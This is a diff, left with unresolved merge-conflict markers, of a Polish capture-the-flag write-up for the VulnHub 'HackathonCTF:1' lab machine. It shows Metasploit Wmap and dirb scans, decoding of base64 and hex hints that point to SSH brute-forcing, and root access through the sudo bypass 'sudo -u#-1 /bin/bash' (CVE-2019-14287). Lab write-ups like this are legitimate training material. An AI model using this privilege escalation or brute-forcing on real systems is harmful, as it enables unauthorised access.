@@ -14,7 +14,11 @@ header:
 HackathonCTF:1 został stworzony (jak i dużo innych ciekawych obrazów) przez [somu sen](https://www.vulnhub.com/author/somu-sen,747/). W tej wirtualce Twoim zadaniem jest zdobycie roota (flag nie widziałem). Ten obraz jest naprawdę prosty i będziesz miał dużo frajdy, jeżeli sam to wszystko przejdziesz. Wirtualka jest na Ubuntu 14.04, więc ja na swoim XPC-NG nawet nie musiałem nic grzebać, żeby sieciówka się dobrze uruchomiła. Obraz ściągniesz [stąd](https://www.vulnhub.com/entry/hackathonctf-1,591/)
 {: .text-justify}
 ## Moduły w Metasploicie
+<<<<<<< HEAD
 Zaczniemy od Metasploita. Przy okazji pokażę, jak się używa w nim modułów. Na tapetę, do celów do celów szkoleniowych weźmiemy moduł [Wmap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/). Jest to skaner stron www. Niestety jest dość stary, ale to nie przeszkadza do pobieżnej analizy. Poniżej jest screen z komend, które wydałem:
+=======
+Zaczniemy od Metasploita. Przy okazji pokażę, jak się używa w nim modułów. Na tapetę, do celów do celów szkoleniowych weźmiemy moduł [Wmap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/). Jest to skaner stron www. Niestety jest dość stary, ale to nie przeszkadza do pobieżnej analizy. Poniżej screen i komendy, które wydałem. 
+>>>>>>> 22aa6df571f3a51b2e5da16a61fbb4e6e8c44934
 {: .text-justify}
 ```bash
 msf6 > load wmap
@@ -262,7 +266,11 @@ msf6 > wmap_vulns -l
 [*]     GET Res code: 404
 msf6 >
 ```
+<<<<<<< HEAD
 Niestety, poza zakodowanym ciągiem w Base64 (**c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**), nic ciekawego ten moduł nie znalazł. Działamy więc ręcznie. Po przeskanowaniu Nmap-em widzimy następujące otwarte porty. 
+=======
+Niestety, poza zakodowanym ciągiem w base64 **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**, nic ciekawego ten moduł nie znalazł. Działamy więc ręcznie. Po przeskanowaniu Nmap-em widzimy następujące otwarte porty. 
+>>>>>>> 22aa6df571f3a51b2e5da16a61fbb4e6e8c44934
 {: .text-justify}
 Należy pamiętać o przełączniku **-p-**, ponieważ ssh jest na nietypowym porcie i szybkie skanowanie nam go nie znajdzie. Polecenie Nmap-a zostawiam czytelnikowi.
 {: .notice--danger}
@@ -275,6 +283,7 @@ host          port  proto  name    state  info
 172.16.1.167  7223  tcp    ssh     open   OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 Ubuntu Linux; protocol 2.0
 ```
 ## Już bez Metasploita
+<<<<<<< HEAD
 Tradycyjnie zacznijmy od Http. Wchodzimy na stronę (u mnie 172.16.1.167) i widzimy komunikat, że nie ma strony. Jednak jeżeli się przyjrzycie, to jest fejk. Strona istnieje, tylko tak jest spreparowana, żeby wyglądało, że jej nie ma ;)
 {: .text-justify}
 Sprawdźmy szybko, czy są jakieś ukryte stronki:
@@ -282,6 +291,15 @@ Sprawdźmy szybko, czy są jakieś ukryte stronki:
 dirb http://172.16.1.167/
 ```
 Z ciekawszych jest **http://172.16.1.167/robots.txt**. Poniżej zawartość:
+=======
+Tradycyjnie zacznijmy od Http. Wchodzimy na stronę (u mnie 172.16.1.167) i widzimy się komunikat, że nie ma strony. Jednak jeżeli się przyjrzycie, to jest fejk. Strona istnieje, tylko tak spreparowana, żeby wyglądało, że jej nie ma ;)
+{: .text-justify}
+Sprawdzmy szybko, czy są jakieś ukryte stronki
+```bash
+dirb http://172.16.1.167/
+```
+Z ciekawszych jest **http://172.16.1.167/robots.txt**
+>>>>>>> 22aa6df571f3a51b2e5da16a61fbb4e6e8c44934
 ```
 user-agent: *
 Disallow: /ctf
@@ -318,7 +336,11 @@ http://172.16.1.167/ftc.html
 ```
 W **sudo.html**  mamy *uname : test*
 
+<<<<<<< HEAD
 W **ftc.html** jest taka ciekawa rzecz:
+=======
+W **ftc.html** jest taka ciekawa rzecz
+>>>>>>> 22aa6df571f3a51b2e5da16a61fbb4e6e8c44934
 ```
 <!-- #117
 #115
@@ -337,7 +359,11 @@ W **ftc.html** jest taka ciekawa rzecz:
 #116
 -->
 ```
+<<<<<<< HEAD
 Zamieńmy skryptem to na przysępny tekst:
+=======
+Zamieńmy to na przysępny tekst
+>>>>>>> 22aa6df571f3a51b2e5da16a61fbb4e6e8c44934
 ```bash
 #!/bin/bash
 
@@ -353,7 +379,13 @@ echo $string -n | xxd -r -p
 ```
 Wychodzi **se rockyou.txt**. 
 
+<<<<<<< HEAD
 Został nam do zdekodowania ciąg **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**, który jest w **robots.txt**. Tam zaś jest zakodowany ciąg w base64. Po zdekodowaniu otrzymujemy **ssh-bruteforce-sudoit**
+=======
+Zostało nam **robots.txt**. Tam zaś jest zakodowany ciąg w base64
+**c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**
+Po zdekodowaniu otrzymujemy **ssh-bruteforce-sudoit**
+>>>>>>> 22aa6df571f3a51b2e5da16a61fbb4e6e8c44934
 ```bash
 echo -n c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg== | base64 -d
 ```
@@ -398,7 +430,11 @@ test@ctf:~$
 ```bash
 sudo -u#-1 /bin/bash
 ```
+<<<<<<< HEAD
 Jest root. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z CVE 2019-14287. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502). Przeglądając historię jeszcze widzimy plik **pass.txt**. Mając root-a szybko coś znajdziemy.
+=======
+Jest root. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z CVE 2019-14287. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502). Przeglądając historię jeszcze widzimy plik **pass.txt**. Mając root-a szybko coś znajdziemy
+>>>>>>> 22aa6df571f3a51b2e5da16a61fbb4e6e8c44934
 {: .text-justify}
 ```bash
 root@ctf:~# find / -name pass.txt
@@ -413,5 +449,9 @@ test@ctf:~$
 ```
 Mamy hasło, ale nie wiadomo do czego. Potem się okazało, że się przydało do pliku /var/zip.rar. W pliku nic nie było.
 {: .text-justify}
+<<<<<<< HEAD
 Podsumowując: Bardzo ciekawy i dosyć łatwy obraz do złamania. W sam raz dla początkujących.
+=======
+Bardzo ciekawy i dosyć łatwy obraz do złamania. W sam raz dla początkujących.
+>>>>>>> 22aa6df571f3a51b2e5da16a61fbb4e6e8c44934
 {: .notice--success}
